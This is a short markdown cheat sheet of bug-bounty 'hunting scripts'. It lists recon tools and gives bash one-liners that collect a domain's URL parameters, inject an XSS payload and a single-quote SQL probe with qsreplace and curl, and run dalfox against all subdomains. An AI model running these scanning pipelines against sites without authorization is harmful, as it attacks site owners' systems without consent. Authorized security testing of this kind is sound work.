# Some hunting scripts

## Tools:
https://github.com/tomnomnom/gf

https://github.com/tomnomnom/waybackurls

https://github.com/lc/gau

https://github.com/tomnomnom/qsreplace

https://github.com/projectdiscovery/httpx

https://github.com/tomnomnom/httprobe

https://github.com/tomnomnom/anew

https://github.com/devanshbatham/ParamSpider

https://github.com/hahwul/dalfox

## Find and testing XSS

```bash
python3 paramspider.py -d domain.com
```

### Output file has stored on output/domain.com.txt

```bash
cat domains.com.txt | gf xss | qsreplace '"><script>confirm(1)</script>' | while read host do; do curl --silent --insecure $host | grep -qs "<script>confirm(1)" && echo "[*] XSS HERE $host" ; done
```

## Find and testing XSS with Dalfox

```bash
subfinder -d domain.com -silent | httpx -l subdomains -silent | dalfox pipe -F -S
```

## Find SQL Injection Error Based
```bash
cat domains.com.txt | gf xss | qsreplace "'" | while read host do; do curl --silent --insecure $host | grep -qs "SQL syntax" && echo "possible sql injection here $host" ; done
```
